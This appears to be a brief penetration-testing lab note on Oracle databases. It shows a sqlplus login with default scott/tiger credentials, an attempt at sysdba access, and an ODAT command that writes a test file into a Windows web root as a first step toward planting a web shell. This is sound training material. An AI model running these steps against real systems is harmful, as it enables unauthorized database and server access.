Logging in 
```shell-session
sqlplus scott/tiger@10.129.152.189/XE
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Trying to log in as system database admin 
```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

# Opening web shell to the target
Default paths:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|
```shell-session
echo "Oracle File Upload Test" > testing.txt


./odat.py utlfile -s 10.129.204.235 -d SID -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

see if its uploaded with curl 
```shell-session
curl -X GET http://10.129.204.235/testing.txt
```
